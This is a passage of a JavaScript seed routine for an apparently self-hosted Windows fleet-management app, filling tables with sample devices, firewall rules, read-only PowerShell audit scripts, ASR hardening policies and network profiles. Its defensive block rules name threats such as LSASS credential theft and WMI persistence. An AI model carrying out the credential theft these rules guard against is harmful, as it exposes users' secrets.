        id, name, description, show_progress, block_until_completed,
        allow_user_reset_on_failure, timeout_minutes, required_app_ids_json, required_script_ids_json,
        target_group_id, is_default
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);

    insertEsp.run(
      'esp-default',
      'Default Fleet Provisioning ESP',
      'Standard 60-minute blocking enrollment status page displaying preparation, device setup, and account setup phases.',
      1, 1, 1, 60, '[]', '[]', 'grp-all', 1
    );

    const insertApDev = db.prepare(`
      INSERT OR IGNORE INTO autopilot_devices (
        id, serial_number, hardware_hash, windows_product_id, model, manufacturer,
        group_tag, assigned_user, profile_id, deployment_status, device_id, last_contact_at
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', ?))
    `);

    const hasDaddy = db.prepare('SELECT id, serial_number FROM devices WHERE id = ?').get('dev-daddy-pc');
    const daddySerial = (hasDaddy && hasDaddy.serial_number) ? hasDaddy.serial_number : 'System Serial Number';

    insertApDev.run(
      'ap-dev-01', daddySerial,
      'T1BSR1VJRDAwMDEyMzQ1Njc4OTAqKipXRUJfSEFSRFdBUkVfSEFTSF9TQU1QTEVfQ0VSVElGSUVEKioqT0VBX0hBU0g=',
      '00330-80000-00000-AAOEM', 'Custom Gaming Workstation', 'ASUSTeK COMPUTER INC.',
      'Workstations', 'tony@localpilot.fleet', 'ap-prof-standard',
      hasDaddy ? 'ENROLLED' : 'ASSIGNED', hasDaddy ? hasDaddy.id : null, '-10 minutes'
    );

    insertApDev.run(
      'ap-dev-02', 'VMW-99210-LAB',
      'VjEtMS4wMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDA=',
      '00331-10000-00000-AAOEM', 'VMware Virtual Platform', 'VMware, Inc.',
      'Homelab', 'lab-admin@localpilot.fleet', 'ap-prof-kiosk',
      'ASSIGNED', null, '-2 hours'
    );

    insertApDev.run(
      'ap-dev-03', 'DELL-XPS-78213',
      'VjEtMi4wMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDA=',
      '00330-50000-00000-AAOEM', 'XPS 15 9530', 'Dell Inc.',
      'Executive', '', null,
      'UNASSIGNED', null, null
    );

    const insertProvEvent = db.prepare(`
      INSERT OR IGNORE INTO autopilot_provisioning_events (
        id, autopilot_device_id, device_id, phase, step_name, status, error_code, details, timestamp
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', ?))
    `);

    insertProvEvent.run('ap-ev-01', 'ap-dev-01', hasDaddy ? hasDaddy.id : null, 'DEVICE_PREPARATION', 'Hardware Attestation & TPM 2.0 Validation', 'COMPLETED', null, 'TPM 2.0 endorsement key verified', '-3 hours');
    insertProvEvent.run('ap-ev-02', 'ap-dev-01', hasDaddy ? hasDaddy.id : null, 'DEVICE_PREPARATION', 'Zero-Trust Host Identity Issuance', 'COMPLETED', null, 'Node token generated and TLS certificate bound', '-2 hours 55 minutes');
    insertProvEvent.run('ap-ev-03', 'ap-dev-01', hasDaddy ? hasDaddy.id : null, 'DEVICE_SETUP', 'Security Baselines & BitLocker Encryption', 'COMPLETED', null, 'Applied enterprise baseline policy', '-2 hours 45 minutes');
    insertProvEvent.run('ap-ev-04', 'ap-dev-01', hasDaddy ? hasDaddy.id : null, 'DEVICE_SETUP', 'Required Core Applications', 'COMPLETED', null, 'Installed 3 required packages', '-2 hours 30 minutes');
    insertProvEvent.run('ap-ev-05', 'ap-dev-01', hasDaddy ? hasDaddy.id : null, 'ACCOUNT_SETUP', 'Primary User Account & LAPS Provisioning', 'COMPLETED', null, 'Created standard user profile and escrowed admin LAPS password', '-2 hours 15 minutes');

    // 12. Remote Actions, Diagnostics Bundles & Bulk Actions
    const insertAction = db.prepare(`
      INSERT OR IGNORE INTO device_remote_actions (
        id, device_id, action_type, parameters_json, status, error_message,
        result_data_json, dispatched_at, completed_at, initiated_by, bulk_action_id, created_at, updated_at
      ) VALUES (?, ?, ?, ?, ?, ?, ?, DATETIME('now', ?), DATETIME('now', ?), ?, ?, DATETIME('now', ?), DATETIME('now', ?))
    `);

    const targetDevId = hasDaddy ? hasDaddy.id : 'dev-daddy-pc';

    insertAction.run(
      'dra-seed-01', targetDevId, 'SYNC_MDM', '{}', 'COMPLETED', null,
      JSON.stringify({ message: 'MDM policies and telemetry refreshed successfully', elapsed_ms: 340 }),
      '-4 hours', '-3 hours 59 minutes', 'Tony (Fleet Administrator)', null, '-4 hours', '-3 hours 59 minutes'
    );

    insertAction.run(
      'dra-seed-02', targetDevId, 'COLLECT_DIAGNOSTICS',
      JSON.stringify({ categories: ['SYSTEM_LOGS', 'SECURITY_LOGS', 'MDM_POLICIES', 'NETWORK'] }),
      'COMPLETED', null,
      JSON.stringify({ bundle_id: 'ddb-seed-01', file_name: 'diagnostics-daddy-pc-20260908.zip', file_size_bytes: 348160 }),
      '-2 hours', '-1 hour 58 minutes', 'Tony (Fleet Administrator)', null, '-2 hours', '-1 hour 58 minutes'
    );

    insertAction.run(
      'dra-seed-03', targetDevId, 'REMOTE_LOCK', '{}', 'COMPLETED', null,
      JSON.stringify({ message: 'User workstation session locked via User32::LockWorkStation' }),
      '-1 hour', '-59 minutes', 'Tony (Fleet Administrator)', null, '-1 hour', '-59 minutes'
    );

    const insertBundle = db.prepare(`
      INSERT OR IGNORE INTO device_diagnostics_bundles (
        id, device_id, remote_action_id, file_name, file_size_bytes, content_type,
        categories_json, status, storage_path, summary_json, collected_at, created_at
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', ?), DATETIME('now', ?))
    `);

    insertBundle.run(
      'ddb-seed-01', targetDevId, 'dra-seed-02', 'diagnostics-daddy-pc-20260908.zip', 348160, 'application/zip',
      JSON.stringify(['SYSTEM_LOGS', 'SECURITY_LOGS', 'MDM_POLICIES', 'NETWORK']), 'READY',
      'server/data/diagnostics/ddb-seed-01.zip',
      JSON.stringify({
        os_version: 'Windows 11 Enterprise (23H2)',
        event_log_records: 150,
        hotfixes_count: 24,
        active_adapters: 2,
        bitlocker_volumes: 1,
        antivirus_healthy: true
      }),
      '-1 hour 58 minutes', '-1 hour 58 minutes'
    );

    const insertBulk = db.prepare(`
      INSERT OR IGNORE INTO bulk_device_actions (
        id, name, action_type, target_group_id, parameters_json,
        total_devices, dispatched_count, completed_count, failed_count, status, created_at, updated_at
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', ?), DATETIME('now', ?))
    `);

    insertBulk.run(
      'bda-seed-01', 'Fleet-wide Telemetry & Policy Synchronization', 'SYNC_MDM', 'grp-all', '{}',
      3, 3, 3, 0, 'COMPLETED', '-4 hours', '-3 hours 58 minutes'
    );

    // 13. Microsoft Intune Windows Firewall Rules & Network Perimeter Governance
    const insertFwRule = db.prepare(`
      INSERT OR IGNORE INTO firewall_rules (
        id, name, description, direction, action, protocol, local_ports, remote_ports,
        local_addresses, remote_addresses, profiles_json, program_path, service_name,
        target_group_id, enabled, priority, created_at, updated_at
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', ?), DATETIME('now', ?))
    `);

    insertFwRule.run(
      'fwr-block-rdp-public',
      'Block Inbound Remote Desktop (RDP 3389) on Public Networks',
      'Restricts incoming Terminal Services / RDP connections when connected to untrusted public Wi-Fi hotspots and cellular networks.',
      'INBOUND', 'BLOCK', 'TCP', '3389', 'ANY', '*', '*',
      JSON.stringify(['Public']), 'ANY', 'ANY', 'grp-all', 1, 10,
      '-5 hours', '-5 hours'
    );

    insertFwRule.run(
      'fwr-block-smb-public',
      'Block Inbound NetBIOS & SMB File Sharing (Ports 137-139, 445) on Public Networks',
      'Prevents lateral traversal and SMB ransomware propagation by denying file and printer sharing ports on public interfaces.',
      'INBOUND', 'BLOCK', 'TCP', '137,138,139,445', 'ANY', '*', '*',
      JSON.stringify(['Public']), 'ANY', 'ANY', 'grp-all', 1, 20,
      '-5 hours', '-5 hours'
    );

    insertFwRule.run(
      'fwr-allow-fleet-intranet',
      'Allow LocalPilot Fleet Telemetry & WinRM (Ports 5985, 8443) on Private Subnets',
      'Enables authenticated on-premises fleet management, secure HTTP API commands, and remote configuration over the local intranet.',
      'INBOUND', 'ALLOW', 'TCP', '5985,8443', 'ANY', '*', '192.168.0.0/16,10.0.0.0/8',
      JSON.stringify(['Domain', 'Private']), 'ANY', 'ANY', 'grp-all', 1, 50,
      '-5 hours', '-5 hours'
    );

    insertFwRule.run(
      'fwr-block-bittorrent',
      'Block Known P2P & Torrent Swarm Traffic (Ports 6881-6889, 51413)',
      'Blocks unauthorized peer-to-peer file transfer protocols and tracker communications across all network profiles.',
      'INBOUND', 'BLOCK', 'TCP', '6881-6889,51413', 'ANY', '*', '*',
      JSON.stringify(['Domain', 'Private', 'Public']), 'ANY', 'ANY', 'grp-all', 1, 80,
      '-5 hours', '-5 hours'
    );

    insertFwRule.run(
      'fwr-allow-dev-web',
      'Allow Local Development Web Servers (Ports 3000, 5173, 8080) on Private LAN',
      'Permits inbound development preview traffic for Node.js, Vite, and Java servers across local trusted subnets.',
      'INBOUND', 'ALLOW', 'TCP', '3000,5173,8080', 'ANY', '*', 'LocalSubnet',
      JSON.stringify(['Private']), 'ANY', 'ANY', 'grp-all', 1, 90,
      '-5 hours', '-5 hours'
    );

    const insertFwStatus = db.prepare(`
      INSERT OR IGNORE INTO device_firewall_status (
        id, device_id, domain_profile_enabled, private_profile_enabled, public_profile_enabled,
        domain_inbound_action, private_inbound_action, public_inbound_action, stealth_mode_enabled,
        active_rules_count, compliance_status, drift_summary_json, last_audit_at, created_at, updated_at
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', ?), DATETIME('now', ?), DATETIME('now', ?))
    `);

    insertFwStatus.run(
      'dfs-seed-01', targetDevId,
      1, 1, 1,
      'Block', 'Block', 'Block', 1,
      5, 'COMPLIANT', '{}',
      '-15 minutes', '-4 hours', '-15 minutes'
    );

    const insertPort = db.prepare(`
      INSERT OR IGNORE INTO device_listening_ports (
        id, device_id, protocol, local_address, local_port, owning_process_id,
        process_name, service_name, risk_level, status, last_seen_at, created_at, updated_at
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', ?), DATETIME('now', ?), DATETIME('now', ?))
    `);

    insertPort.run(
      'dlp-seed-01', targetDevId, 'TCP', '0.0.0.0', 8443, 24756,
      'node.exe', 'LocalPilot Fleet Server', 'LOW', 'AUTHORIZED',
      '-5 minutes', '-4 hours', '-5 minutes'
    );

    insertPort.run(
      'dlp-seed-02', targetDevId, 'TCP', '0.0.0.0', 5985, 1024,
      'svchost.exe', 'Windows Remote Management (WS-Management)', 'MEDIUM', 'AUTHORIZED',
      '-5 minutes', '-4 hours', '-5 minutes'
    );

    insertPort.run(
      'dlp-seed-03', targetDevId, 'TCP', '127.0.0.1', 3000, 18420,
      'node.exe', 'Vite / React Dev Server', 'LOW', 'AUTHORIZED',
      '-5 minutes', '-2 hours', '-5 minutes'
    );
  }

  // 17. Device PowerShell Scripts
  const scriptCount = db.prepare('SELECT COUNT(*) as count FROM device_scripts').get().count;
  if (scriptCount === 0) {
    const insertScript = db.prepare(`
      INSERT OR IGNORE INTO device_scripts (
        id, name, description, script_content, run_as_account, run_as_32bit,
        enforce_signature_check, timeout_seconds, target_group_id, assignment_intent,
        run_frequency, enabled, created_at, updated_at
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', ?), DATETIME('now', ?))
    `);

    insertScript.run(
      'ps-local-admins',
      'Enumerate Local Administrators Group & Privileged Accounts',
      'Audits all local and domain accounts with administrative privileges on the workstation',
      "Get-LocalGroupMember -Group 'Administrators' | Select-Object Name, PrincipalSource, ObjectClass | Format-Table -AutoSize",
      'SYSTEM', 0, 0, 60, 'grp-all', 'ASSIGNED', 'ONCE', 1,
      '-6 hours', '-6 hours'
    );

    insertScript.run(
      'ps-cert-audit',
      'Audit Local Machine Certificates & Expired SSL Roots',
      'Scans the LocalMachine certificate store for expired certificates or untrusted roots',
      "Get-ChildItem -Path Cert:\\LocalMachine\\My, Cert:\\LocalMachine\\Root | Where-Object { $_.NotAfter -lt (Get-Date).AddDays(30) } | Select-Object Subject, Thumbprint, NotAfter | Format-Table -AutoSize",
      'SYSTEM', 0, 0, 60, 'grp-all', 'ASSIGNED', 'ONCE', 1,
      '-6 hours', '-6 hours'
    );

    insertScript.run(
      'ps-dns-health',
      'Network Stack Health, DNS Cache Flush & Gateway Reachability',
      'Validates default gateway ARP reachability and flushes local DNS client resolver cache',
      "Clear-DnsClientCache; Test-NetConnection -ComputerName 1.1.1.1 -InformationLevel Detailed | Select-Object ComputerName, PingSucceeded, RoundTripTime",
      'SYSTEM', 0, 0, 60, 'grp-all', 'ASSIGNED', 'ONCE', 1,
      '-6 hours', '-6 hours'
    );

    insertScript.run(
      'ps-disk-cleanup',
      'Enterprise Disk Footprint & Component Store Cleanup',
      'Analyzes WinSxS component store and temporary cache footprint',
      "Dism.exe /Online /Cleanup-Image /AnalyzeComponentStore",
      'SYSTEM', 0, 0, 120, 'grp-low-storage', 'ASSIGNED', 'ONCE', 1,
      '-6 hours', '-6 hours'
    );

    insertScript.run(
      'ps-wua-reset',
      'Windows Update Agent Subsystem Diagnostics & Soft Reset',
      'Checks the Windows Update service state and restarts WUA services if stuck',
      "Get-Service -Name wuauserv, bits, cryptsvc | Select-Object Name, Status, StartType | Format-Table -AutoSize",
      'SYSTEM', 0, 0, 60, 'grp-win11-modern', 'ASSIGNED', 'ONCE', 1,
      '-6 hours', '-6 hours'
    );

    const targetDevId = '6ae3a5d2-6051-4c12-a604-fae0a0df41e6';
    const devExists = db.prepare('SELECT id FROM devices WHERE id = ?').get(targetDevId);
    if (devExists) {
      const insertRun = db.prepare(`
        INSERT OR IGNORE INTO device_script_runs (
          id, device_id, script_id, run_mode, status, exit_code, stdout, stderr, execution_time_ms, executed_at, created_at, updated_at
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', ?), DATETIME('now', ?), DATETIME('now', ?))
      `);

      insertRun.run(
        'dsr-seed-01', targetDevId, 'ps-local-admins', 'ASSIGNED', 'SUCCESS', 0,
        "Name                 PrincipalSource ObjectClass\n----                 --------------- -----------\nDESKTOP-R0H12DJ\\Tony Local           User\nAdministrator        Local           User",
        "", 420, '-1 hour', '-1 hour', '-1 hour'
      );
    }
  }

  // 18. ASR Policies (Attack Surface Reduction)
  const asrPolicyCount = db.prepare('SELECT COUNT(*) as count FROM asr_policies').get().count;
  if (asrPolicyCount === 0) {
    const ASR_RULES_AUDIT = {
      'be9ba2d9-53ea-4cdc-84e5-9b1eeee46550': 'AUDIT',
      '3b576869-a4ec-4529-8536-b80a7769e899': 'AUDIT',
      '75668c1f-73b5-4cf0-bb93-3ecf5cb7cc84': 'AUDIT',
      'd4f940ab-401b-4efc-aadc-ad5f3c50688a': 'AUDIT',
      '26190899-1602-49e8-8b27-eb1d0a1ce869': 'AUDIT',
      'e6db77e5-3df2-4cf1-b95a-636979351e5b': 'AUDIT',
      'd3e037e1-3eb8-44c8-a917-57927947596d': 'AUDIT',
      '5beb7efe-fd9a-4556-801d-275e5ffc04cc': 'AUDIT',
      '92e97fa1-2edf-4476-bdd6-9dd0b4dddc7b': 'AUDIT',
      '01443614-cd74-433a-b99e-2ecdc07bfc25': 'AUDIT',
      'c1db55ab-c21a-4637-bb3f-a12568109d35': 'AUDIT',
      '9e6c4e1f-7d60-472f-ba1a-a39ef669e4b0': 'AUDIT',
      'd1e49aac-8f56-4280-b9ba-993a6d77406c': 'AUDIT',
      'b2b3f03d-6a65-4f7b-a9c7-1c7ef74a9ba4': 'AUDIT',
      'c0033c00-d16d-4114-a5a0-dc9b3a7d2ceb': 'AUDIT',
      '7674ba52-37eb-4a4f-a9a1-f0f9a1619a2c': 'AUDIT'
    };

    const ASR_RULES_BLOCK = {
      'be9ba2d9-53ea-4cdc-84e5-9b1eeee46550': 'BLOCK',
      '3b576869-a4ec-4529-8536-b80a7769e899': 'BLOCK',
      '75668c1f-73b5-4cf0-bb93-3ecf5cb7cc84': 'BLOCK',
      'd4f940ab-401b-4efc-aadc-ad5f3c50688a': 'BLOCK',
      '26190899-1602-49e8-8b27-eb1d0a1ce869': 'BLOCK',
      'e6db77e5-3df2-4cf1-b95a-636979351e5b': 'BLOCK',
      'd3e037e1-3eb8-44c8-a917-57927947596d': 'BLOCK',
      '5beb7efe-fd9a-4556-801d-275e5ffc04cc': 'BLOCK',
      '92e97fa1-2edf-4476-bdd6-9dd0b4dddc7b': 'BLOCK',
      '01443614-cd74-433a-b99e-2ecdc07bfc25': 'BLOCK',
      'c1db55ab-c21a-4637-bb3f-a12568109d35': 'BLOCK',
      '9e6c4e1f-7d60-472f-ba1a-a39ef669e4b0': 'BLOCK',
      'd1e49aac-8f56-4280-b9ba-993a6d77406c': 'BLOCK',
      'b2b3f03d-6a65-4f7b-a9c7-1c7ef74a9ba4': 'BLOCK',
      'c0033c00-d16d-4114-a5a0-dc9b3a7d2ceb': 'BLOCK',
      '7674ba52-37eb-4a4f-a9a1-f0f9a1619a2c': 'BLOCK'
    };

    // Gaming: only high-confidence rules BLOCK, others AUDIT or DISABLED
    const ASR_RULES_GAMING = {
      'be9ba2d9-53ea-4cdc-84e5-9b1eeee46550': 'BLOCK',  // email executable
      '3b576869-a4ec-4529-8536-b80a7769e899': 'AUDIT',
      '75668c1f-73b5-4cf0-bb93-3ecf5cb7cc84': 'AUDIT',
      'd4f940ab-401b-4efc-aadc-ad5f3c50688a': 'AUDIT',
      '26190899-1602-49e8-8b27-eb1d0a1ce869': 'AUDIT',
      'e6db77e5-3df2-4cf1-b95a-636979351e5b': 'BLOCK',  // WMI persistence
      'd3e037e1-3eb8-44c8-a917-57927947596d': 'AUDIT',
      '5beb7efe-fd9a-4556-801d-275e5ffc04cc': 'AUDIT',
      '92e97fa1-2edf-4476-bdd6-9dd0b4dddc7b': 'AUDIT',
      '01443614-cd74-433a-b99e-2ecdc07bfc25': 'DISABLED',
      'c1db55ab-c21a-4637-bb3f-a12568109d35': 'BLOCK',  // ransomware protection
      '9e6c4e1f-7d60-472f-ba1a-a39ef669e4b0': 'BLOCK',  // LSASS credential steal
      'd1e49aac-8f56-4280-b9ba-993a6d77406c': 'AUDIT',
      'b2b3f03d-6a65-4f7b-a9c7-1c7ef74a9ba4': 'AUDIT',
      'c0033c00-d16d-4114-a5a0-dc9b3a7d2ceb': 'AUDIT',
      '7674ba52-37eb-4a4f-a9a1-f0f9a1619a2c': 'AUDIT'
    };

    const insertAsr = db.prepare(`
      INSERT OR IGNORE INTO asr_policies (
        id, name, description, target_group_id, enabled,
        asr_rules_json, exploit_protection_json, network_protection_mode, controlled_folder_access,
        created_at, updated_at
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, DATETIME('now', ?), DATETIME('now', ?))
    `);

    insertAsr.run(
      'asr-pol-audit', 'Windows 11 ASR Audit Baseline',
      'Enterprise audit-mode baseline — all 16 Microsoft ASR rules set to AUDIT for visibility without blocking.',
      'grp-all', 1,
      JSON.stringify(ASR_RULES_AUDIT), '{}', 'AUDIT', 'AUDIT',
      '-1 day', '-1 day'
    );

    insertAsr.run(
      'asr-pol-block', 'Zero-Trust ASR Block Policy',
      'Maximum enterprise hardening — all 16 ASR rules BLOCK, Network Protection BLOCK, CFA BLOCK.',
      'grp-win11-modern', 1,
      JSON.stringify(ASR_RULES_BLOCK), '{}', 'BLOCK', 'BLOCK',
      '-1 day', '-1 day'
    );

    insertAsr.run(
      'asr-pol-gaming', 'Gaming Rig ASR Policy',
      'Lightweight ASR for gaming rigs — high-confidence rules BLOCK, others AUDIT, CFA DISABLED to avoid game launcher conflicts.',
      'grp-workstations', 1,
      JSON.stringify(ASR_RULES_GAMING), '{}', 'AUDIT', 'DISABLED',
      '-1 day', '-1 day'
    );
  }

  // 19. Organizational Messages
  const msgCount = db.prepare('SELECT COUNT(*) as count FROM organizational_messages').get().count;
  if (msgCount === 0) {
    const insertMsg = db.prepare(`
      INSERT OR IGNORE INTO organizational_messages (
        id, title, message_body, surface, theme, target_group_id, action_url, action_label, start_date, frequency, enabled, created_at, updated_at
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, DATE('now'), ?, 1, DATETIME('now', ?), DATETIME('now', ?))
    `);

    insertMsg.run(
      'msg-reboot-reminder',
      'Windows Quality Updates Installed — Restart Required',
      'Monthly enterprise security hotfixes have been staged. Please restart your PC to finalize protection.',
      'TOAST', 'UPDATE', 'grp-all', 'ms-settings:windowsupdate', 'Review Updates', 'ONCE',
      '-2 days', '-2 days'
    );

    insertMsg.run(
      'msg-onboarding-welcome',
      'Welcome to LocalPilot Enterprise Fleet Management',
      'Your workstation is enrolled in automated compliance and zero-trust health monitoring.',
      'TASKBAR', 'ONBOARDING', 'grp-all', 'https://github.com/thebubbsy/LocalPilotFleet', 'View Docs', 'ONCE',
      '-2 days', '-2 days'
    );

    insertMsg.run(
      'msg-security-quarantine-warning',
      'Zero-Trust Health Advisory: Defender Real-Time Protection',
      'Ensure real-time anti-malware protection and endpoint firewall remain enabled to prevent automated quarantine.',
      'MODAL', 'CRITICAL', 'grp-all', 'windowsdefender:', 'Open Defender', 'DAILY',
      '-2 days', '-2 days'
    );
  }

  // 20. SCEP & PKCS Certificate Profiles
  const certProfCount = db.prepare('SELECT COUNT(*) as count FROM certificate_profiles').get().count;
  if (certProfCount === 0) {
    const insertCertProf = db.prepare(`
      INSERT OR IGNORE INTO certificate_profiles (
        id, name, description, certificate_type, target_store, target_group_id,
        certificate_data_base64, thumbprint, subject_name, validity_period_days,
        key_storage_provider, key_size, scep_server_url, renewal_threshold_pct,
        enabled, created_at, updated_at
      ) VALUES (
        ?, ?, ?, ?, ?, ?,
        ?, ?, ?, ?,
        ?, ?, ?, ?,
        1, DATETIME('now', ?), DATETIME('now', ?)
      )
    `);

    insertCertProf.run(
      'cert-enterprise-root-ca',
      'LocalPilot Fleet Zero-Trust Root CA',
      'Enterprise root certification authority certificate for internal TLS trust, device authentication, and zero-trust VPN validation.',
      'TRUSTED_ROOT', 'LOCAL_MACHINE_ROOT', 'grp-all',
      'MIICXDCCAcWgAwIBAgIQX5b...LocalPilotRootCA', 'A1B2C3D4E5F60718293A4B5C6D7E8F9012345678',
      'CN=LocalPilot Fleet Enterprise Root CA, O=LocalPilot Security, C=US', 3650,
      'RSA', 4096, '', 20,
      '-3 days', '-3 days'
    );

    insertCertProf.run(
      'cert-scep-workstation-auth',
      'Workstation SCEP Client Authentication Profile',
      'Automated SCEP certificate enrollment profile for 802.1X corporate network authentication and Wi-Fi access.',
      'SCEP', 'LOCAL_MACHINE_MY', 'grp-all',
      '', '',
      'CN={{DeviceName}}, OU=Workstations, O=LocalPilot Fleet', 365,
      'RSA', 2048, 'https://ca.localpilot.internal/certsrv/mscep/mscep.dll', 20,
      '-3 days', '-3 days'
    );

    insertCertProf.run(
      'cert-intermediate-tls-chain',
      'LocalPilot Internal Services Intermediate CA',
      'Subordinate CA certificate chain for internal services, HTTPS proxies, and local cloud endpoints.',
      'INTERMEDIATE_CA', 'LOCAL_MACHINE_CA', 'grp-all',
      'MIICXDCCAcWgAwIBAgIQY6c...LocalPilotSubCA', 'F0E1D2C3B4A5968778695A4B3C2D1E0F12345678',
      'CN=LocalPilot Issuing SubCA 01, O=LocalPilot Security, C=US', 1825,
      'RSA', 4096, '', 20,
      '-3 days', '-3 days'
    );
  }

  // 21. Wi-Fi & VPN Configuration Profiles
  const netProfCount = db.prepare('SELECT COUNT(*) as count FROM network_profiles').get().count;
  if (netProfCount === 0) {
    const insertNetProf = db.prepare(`
      INSERT OR IGNORE INTO network_profiles (
        id, name, description, network_type, target_group_id,
        connection_name, ssid, hidden_network, security_type, eap_type,
        server_address, split_tunneling, always_on, auto_connect,
        proxy_type, proxy_server, proxy_port, root_cert_thumbprint,
        client_cert_thumbprint, raw_profile_xml, enabled, created_at, updated_at
      ) VALUES (
        ?, ?, ?, ?, ?,
        ?, ?, ?, ?, ?,
        ?, ?, ?, ?,
        ?, ?, ?, ?,
        ?, ?, 1, DATETIME('now', ?), DATETIME('now', ?)
      )
    `);

    insertNetProf.run(
      'net-corp-wifi-8021x',
      'Corporate Zero-Trust 802.1X Wi-Fi',
      'High-assurance WPA3 Enterprise Wi-Fi with 802.1X EAP-TLS client certificate authentication and auto-connect.',
      'WIFI', 'grp-all',
      'CorpNet-Secure', 'CorpNet-Secure', 0, 'WPA3_ENTERPRISE', 'EAP_TLS',
      '', 1, 0, 1,
      'NONE', '', 8080, 'A1B2C3D4E5F60718293A4B5C6D7E8F9012345678',
      '', '',
      '-3 days', '-3 days'
    );

    insertNetProf.run(
      'net-zerotrust-wireguard-vpn',
      'Always-On Zero-Trust Mesh VPN',
      'Ultra low-latency WireGuard mesh tunnel for seamless homelab and corporate resource access with split tunneling.',
      'VPN', 'grp-all',
      'LocalPilot-Mesh', '', 0, 'WIREGUARD', 'CERTIFICATE',
      'vpn.corp.localpilot.io:51820', 1, 1, 1,
      'NONE', '', 8080, '',
      '', '',
      '-3 days', '-3 days'
    );

    insertNetProf.run(
      'net-enterprise-ikev2-vpn',
      'Enterprise IKEv2 / IPsec Remote Access',
      'Standard Microsoft Windows native IKEv2 VPN tunnel for remote branch connectivity and domain controller access.',
      'VPN', 'grp-all',
      'Corp-IKEv2-Remote', '', 0, 'IKEv2', 'EAP_TLS',
      'gateway.corp.localpilot.io', 1, 0, 0,
      'NONE', '', 8080, 'A1B2C3D4E5F60718293A4B5C6D7E8F9012345678',
      '', '',
      '-3 days', '-3 days'
    );
  }

  // 22. Kiosk Mode & Multi-App Assigned Access Profiles
  const kioskProfCount = db.prepare('SELECT COUNT(*) as count FROM kiosk_profiles').get().count;
  if (kioskProfCount === 0) {
    const insertKioskProf = db.prepare(`
      INSERT OR IGNORE INTO kiosk_profiles (
        id, name, description, kiosk_mode, target_group_id,
        logon_type, user_account, app_type, app_path_or_aumid,
        edge_kiosk_type, edge_kiosk_url, edge_idle_timeout_min,
        allowed_apps_json, custom_layout_xml, disable_taskbar,
        disable_cad_keys, restart_on_exit, enabled, created_at, updated_at
      ) VALUES (
        ?, ?, ?, ?, ?,
        ?, ?, ?, ?,
        ?, ?, ?,
        ?, ?, ?,
        ?, ?, 1, DATETIME('now', ?), DATETIME('now', ?)
      )
    `);

    insertKioskProf.run(
      'kiosk-edge-digital-signage',
      '4K Corporate Digital Signage & Display Wall',
      'Single-app full-screen Microsoft Edge digital signage display with auto-logon and keyboard lockdown for lobby displays.',
      'DIGITAL_SIGNAGE', 'grp-all',
      'AUTO_LOGON', 'KioskUser0', 'EDGE_BROWSER', 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe',
      'DIGITAL_SIGNAGE', 'https://signage.localpilot.internal/dashboard', 0,
      '[]', '', 1,
      1, 1,
      '-3 days', '-3 days'
    );

    insertKioskProf.run(
      'kiosk-frontdesk-interactive',
      'Front-Desk Customer Self-Service Kiosk',
      'Public browsing interactive kiosk running Edge InPrivate with a 5-minute inactivity session reset and restricted navigation.',
      'SINGLE_APP', 'grp-all',
      'AUTO_LOGON', 'KioskVisitor', 'EDGE_BROWSER', 'Microsoft.MicrosoftEdge_8wekyb3d8bbwe!MicrosoftEdge',
      'PUBLIC_BROWSING', 'https://visitor.localpilot.internal', 5,
      '[]', '', 1,
      1, 1,
      '-3 days', '-3 days'
    );

    insertKioskProf.run(
      'kiosk-line-of-business-pos',
      'Retail POS & Multi-App Terminal',
      'Multi-app assigned access lockdown environment providing access to Edge POS WebApp, Windows Calculator, and Barcode scanner.',
      'MULTI_APP', 'grp-all',
      'LOCAL_USER', 'PosOperator', 'MULTI_APP_XML', '',
      'FULL_SCREEN_INTERACTIVE', 'https://pos.localpilot.internal', 15,
      JSON.stringify([
        { name: 'POS Web Application', aumid: 'Microsoft.MicrosoftEdge.Stable_8wekyb3d8bbwe!App', path: 'msedge.exe', tile_size: 'Medium' },
        { name: 'Calculator', aumid: 'Microsoft.WindowsCalculator_8wekyb3d8bbwe!App', path: 'calc.exe', tile_size: 'Small' }
      ]),
      '<AssignedAccessConfiguration xmlns="http://schemas.microsoft.com/AssignedAccess/2017/config"></AssignedAccessConfiguration>',
      0, 1, 1,
      '-3 days', '-3 days'
    );
  }

  // 23. Removable Storage Access Control & USB Peripheral Governance
  const storagePolCount = db.prepare('SELECT COUNT(*) as count FROM storage_access_policies').get().count;
  if (storagePolCount === 0) {
    const insertStorPol = db.prepare(`
      INSERT OR IGNORE INTO storage_access_policies (
        id, name, description, target_group_id,
        removable_disk_access, require_bitlocker_to_go, block_wpd_devices,
        block_bluetooth, allowed_hardware_ids_json, audit_only,
        enabled, created_at, updated_at
      ) VALUES (
        ?, ?, ?, ?,
        ?, ?, ?,
        ?, ?, ?,
        1, DATETIME('now', ?), DATETIME('now', ?)
      )
    `);

    insertStorPol.run(
      'stor-corp-bitlocker-to-go',
      'Corporate Zero-Trust Removable Storage Policy',
      'Denies write access to unencrypted USB storage drives. Requires BitLocker To Go encryption for data egress prevention.',
      'grp-all',
      'DENY_UNENCRYPTED', 1, 0,
      0, '[]', 0,
      '-3 days', '-3 days'
    );

    insertStorPol.run(
      'stor-strict-airgap-lockdown',
      'Air-Gap High-Security USB & Peripheral Lockdown',
      'Completely denies all removable storage devices, blocks WPD smartphones (MTP), and prohibits Bluetooth file transfer.',
